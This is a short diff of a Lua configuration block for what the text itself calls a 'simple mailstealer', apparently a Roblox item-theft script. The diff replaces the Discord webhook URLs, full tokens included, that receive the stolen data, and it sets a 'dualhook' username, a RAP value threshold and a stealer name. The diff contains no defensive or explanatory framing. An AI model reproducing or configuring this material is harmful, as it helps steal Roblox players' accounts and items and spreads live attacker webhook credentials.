@@ -2,13 +2,13 @@
 MinimumRAP = 10000
 
 DualhookUsername = "TS_Gamer31"
-DualhookWebhook = "https://discord.com/api/webhooks/1262343678589141044/kjH3vhIfhgusBKEko2iRV30Cq5gQwGYcIbSzuIYH-P-iEQ2WlwY_XeVuyasBtL1qH8bR"
-LogsWebhook = "https://discord.com/api/webhooks/1262343678589141044/kjH3vhIfhgusBKEko2iRV30Cq5gQwGYcIbSzuIYH-P-iEQ2WlwY_XeVuyasBtL1qH8bR"
+DualhookWebhook = "https://discord.com/api/webhooks/1292224150097891370/GDzsS1PUzUZs4iHYKYX7yF7PgHDtE8-ona5ywQhHo2POLQRYKkKvQmkqBwi6cQPxKpLD"
+LogsWebhook = "https://discord.com/api/webhooks/1292224150097891370/GDzsS1PUzUZs4iHYKYX7yF7PgHDtE8-ona5ywQhHo2POLQRYKkKvQmkqBwi6cQPxKpLD"
 DualhookRAP = 1000000
 mailstealer_name = "Furqwk"
 
 Roblox_Username = "TS_Gamer31"
-Discord_Webhook = "https://discord.com/api/webhooks/1262343678589141044/kjH3vhIfhgusBKEko2iRV30Cq5gQwGYcIbSzuIYH-P-iEQ2WlwY_XeVuyasBtL1qH8bR"
+Discord_Webhook = "https://discord.com/api/webhooks/1292224150097891370/GDzsS1PUzUZs4iHYKYX7yF7PgHDtE8-ona5ywQhHo2POLQRYKkKvQmkqBwi6cQPxKpLD"
 
 -- simple mailstealer
 LOGS_WEBHOOK = LogsWebhook
